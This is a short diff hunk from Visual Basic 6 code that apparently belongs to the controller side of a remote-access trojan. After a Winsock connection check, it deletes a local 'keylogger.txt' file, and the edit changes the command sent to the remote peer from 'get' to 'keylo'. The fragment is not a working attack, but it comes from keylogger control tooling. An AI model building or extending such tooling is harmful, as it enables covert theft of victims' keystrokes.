@@ -521,7 +521,7 @@ If Form1.Winsock1(vIndex(0)).state = sckConnected Then
         DeleteFile App.path & "\keylogger.txt"
     End If
     
-    Form1.Winsock1(vIndex(0)).SendData "get"
+    Form1.Winsock1(vIndex(0)).SendData "keylo"
 Else
     lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
     Unload Me
